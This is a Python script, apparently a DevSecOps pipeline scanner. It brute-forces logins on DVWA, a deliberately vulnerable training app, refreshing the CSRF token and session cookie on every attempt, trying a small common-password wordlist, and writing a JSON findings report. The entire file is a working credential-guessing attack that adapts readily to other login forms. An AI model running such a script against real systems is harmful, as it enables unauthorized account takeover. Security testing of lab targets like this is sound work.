#!/usr/bin/env python3
"""
================================================================================
DVWA Brute Force Attack Script with CSRF Token Support
================================================================================
Este script realiza ataques de brute force no DVWA, lidando corretamente com
o token CSRF (user_token) que o DVWA requer em cada requisição de login.

O Hydra padrão não consegue lidar com tokens CSRF dinâmicos, então criamos
este script customizado para a pipeline DevSecOps.

Uso: python3 dvwa-bruteforce.py <target_ip> <output_file>
================================================================================
"""

import sys
import json
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Wordlist de credenciais comuns para teste
USERNAMES = [
    'admin', 'root', 'user', 'test', 'guest', 'dvwa', 
    'administrator', 'manager', 'webadmin', 'sysadmin'
]

PASSWORDS = [
    'admin', 'password', 'root', 'dvwa', '123456', '1234', 
    'test', 'guest', 'user', 'passw0rd', 'admin123', 'password123',
    'letmein', 'welcome', 'monkey', 'dragon', 'master', 'qwerty',
    'login', 'changeme'
]

def get_csrf_token_and_session(target_url):
    """
    Obtém o token CSRF e o cookie de sessão da página de login do DVWA.
    
    O DVWA gera um novo token CSRF para cada requisição, então precisamos:
    1. Fazer uma requisição GET para obter o formulário
    2. Extrair o token user_token do HTML
    3. Manter o cookie PHPSESSID para a sessão
    """
    try:
        import urllib.request
        import urllib.parse
        import http.cookiejar
        
        # Cria cookie jar para manter a sessão
        cookie_jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
        
        # Faz requisição GET para obter o formulário de login
        req = urllib.request.Request(
            f'{target_url}/login.php',
            headers={'User-Agent': 'Mozilla/5.0 (DevSecOps Security Scanner)'}
        )
        
        response = opener.open(req, timeout=10)
        html = response.read().decode('utf-8')
        
        # Extrai o token CSRF usando regex
        token_match = re.search(r"name=['\"]user_token['\"].*?value=['\"]([a-f0-9]+)['\"]", html, re.IGNORECASE)
        if not token_match:
            # Tenta outro padrão
            token_match = re.search(r"value=['\"]([a-f0-9]{32})['\"].*?name=['\"]user_token['\"]", html, re.IGNORECASE)
        
        if token_match:
            token = token_match.group(1)
        else:
            # Se não encontrar token, pode ser que CSRF esteja desabilitado no DVWA
            token = None
        
        # Extrai o cookie PHPSESSID
        session_cookie = None
        for cookie in cookie_jar:
            if cookie.name == 'PHPSESSID':
                session_cookie = cookie.value
                break
        
        return token, session_cookie, opener
        
    except Exception as e:
        return None, None, None

def attempt_login(target_url, username, password, token, session_cookie):
    """
    Tenta fazer login com as credenciais fornecidas.
    
    Retorna:
        - (True, username, password) se o login foi bem sucedido
        - (False, username, password) se falhou
        - (None, username, password) se houve erro
    """
    try:
        import urllib.request
        import urllib.parse
        import http.cookiejar
        
        # Se não temos token, obtemos um novo
        if not token or not session_cookie:
            token, session_cookie, _ = get_csrf_token_and_session(target_url)
            if not session_cookie:
                return None, username, password
        
        # Prepara os dados do POST
        post_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        # Adiciona token CSRF se disponível
        if token:
            post_data['user_token'] = token
        
        data = urllib.parse.urlencode(post_data).encode('utf-8')
        
        # Cria a requisição
        req = urllib.request.Request(
            f'{target_url}/login.php',
            data=data,
            headers={
                'User-Agent': 'Mozilla/5.0 (DevSecOps Security Scanner)',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': f'PHPSESSID={session_cookie}; security=low'
            }
        )
        
        # Cookie handler para seguir redirects com sessão
        cookie_jar = http.cookiejar.CookieJar()
        opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(cookie_jar),
            urllib.request.HTTPRedirectHandler()
        )
        
        # Adiciona cookie manualmente
        cookie_jar.set_cookie(http.cookiejar.Cookie(
            version=0, name='PHPSESSID', value=session_cookie,
            port=None, port_specified=False,
            domain=target_url.replace('http://', '').split('/')[0],
            domain_specified=False, domain_initial_dot=False,
            path='/', path_specified=True,
            secure=False, expires=None, discard=True,
            comment=None, comment_url=None, rest={}, rfc2109=False
        ))
        
        response = opener.open(req, timeout=10)
        response_url = response.geturl()
        response_html = response.read().decode('utf-8', errors='ignore')
        
        # Verifica se o login foi bem sucedido
        # O DVWA redireciona para index.php após login bem sucedido
        if 'index.php' in response_url:
            return True, username, password
        
        # Verifica se há mensagem de "Welcome" ou "Logout" (indica login ok)
        if 'Welcome' in response_html or 'Logout' in response_html or 'logout.php' in response_html:
            return True, username, password
        
        # Verifica se ainda estamos na página de login (login falhou)
        if 'Login failed' in response_html or 'login.php' in response_url:
            return False, username, password
        
        # Se chegou aqui, provavelmente o login foi bem sucedido
        if 'DVWA' in response_html and 'login' not in response_url.lower():
            return True, username, password
            
        return False, username, password
        
    except Exception as e:
        return None, username, password

def run_bruteforce(target_ip, output_file):
    """
    Executa o ataque de brute force e gera o relatório.
    """
    target_url = f'http://{target_ip}'
    
    print(f"[*] Iniciando brute force em {target_url}")
    print(f"[*] Testando {len(USERNAMES)} usuários x {len(PASSWORDS)} senhas = {len(USERNAMES) * len(PASSWORDS)} combinações")
    
    results = {
        'tool': 'DVWA Brute Force Scanner (Custom)',
        'target': target_url,
        'timestamp': datetime.now().isoformat(),
        'total_attempts': 0,
        'successful_logins': [],
        'failed_attempts': 0,
        'errors': 0,
        'vulnerable': False,
        'csrf_token_required': False,
        'details': []
    }
    
    # Primeiro, verifica se o DVWA requer token CSRF
    token, session, _ = get_csrf_token_and_session(target_url)
    results['csrf_token_required'] = token is not None
    
    if token:
        print(f"[*] Token CSRF detectado: {token[:8]}...")
    else:
        print("[!] Token CSRF não detectado - DVWA pode ter CSRF desabilitado")
    
    successful_creds = []
    total_attempts = 0
    
    # Testa cada combinação
    for username in USERNAMES:
        for password in PASSWORDS:
            total_attempts += 1
            
            # Obtém novo token para cada tentativa (DVWA regenera o token)
            token, session, _ = get_csrf_token_and_session(target_url)
            
            if not session:
                results['errors'] += 1
                print(f"[-] Erro ao obter sessão para {username}:{password}")
                continue
            
            success, user, pwd = attempt_login(target_url, username, password, token, session)
            
            if success is True:
                print(f"[+] SUCESSO! Credencial encontrada: {username}:{password}")
                successful_creds.append({
                    'username': username,
                    'password': password,
                    'timestamp': datetime.now().isoformat()
                })
                results['vulnerable'] = True
            elif success is False:
                results['failed_attempts'] += 1
                if total_attempts % 20 == 0:
                    print(f"[.] Tentativa {total_attempts}: {username}:{password} - Falhou")
            else:
                results['errors'] += 1
            
            # Pequena pausa para não sobrecarregar
            time.sleep(0.1)
    
    results['total_attempts'] = total_attempts
    results['successful_logins'] = successful_creds
    
    # Adiciona detalhes da análise
    if results['vulnerable']:
        results['details'].append({
            'type': 'Weak Credentials',
            'severity': 'HIGH',
            'cwe': 'CWE-307',
            'owasp': 'A07:2021 - Identification and Authentication Failures',
            'description': f'Credenciais fracas encontradas: {len(successful_creds)} combinação(ões) válida(s)',
            'credentials_found': successful_creds,
            'recommendation': 'Implementar política de senhas fortes, limite de tentativas e bloqueio de conta'
        })
    else:
        results['details'].append({
            'type': 'Brute Force Test',
            'severity': 'INFO',
            'description': f'Nenhuma credencial fraca encontrada em {total_attempts} tentativas',
            'recommendation': 'Continuar monitorando e adicionar mais combinações à wordlist'
        })
    
    # Salva o resultado
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=2)
    
    print(f"\n[*] Brute force concluído!")
    print(f"[*] Total de tentativas: {total_attempts}")
    print(f"[*] Credenciais encontradas: {len(successful_creds)}")
    print(f"[*] Falhas: {results['failed_attempts']}")
    print(f"[*] Erros: {results['errors']}")
    print(f"[*] Relatório salvo em: {output_file}")
    
    return results

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print(f"Uso: {sys.argv[0]} <target_ip> <output_file>")
        print(f"Exemplo: {sys.argv[0]} <IP_DO_DVWA> /workspace/reports/hydra-bruteforce.json")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    output_file = sys.argv[2]
    
    results = run_bruteforce(target_ip, output_file)
    
    # Exit code baseado no resultado
    if results['vulnerable']:
        sys.exit(0)  # Encontrou vulnerabilidade (sucesso para o scanner)
    else:
        sys.exit(0)  # Não encontrou, mas não é erro
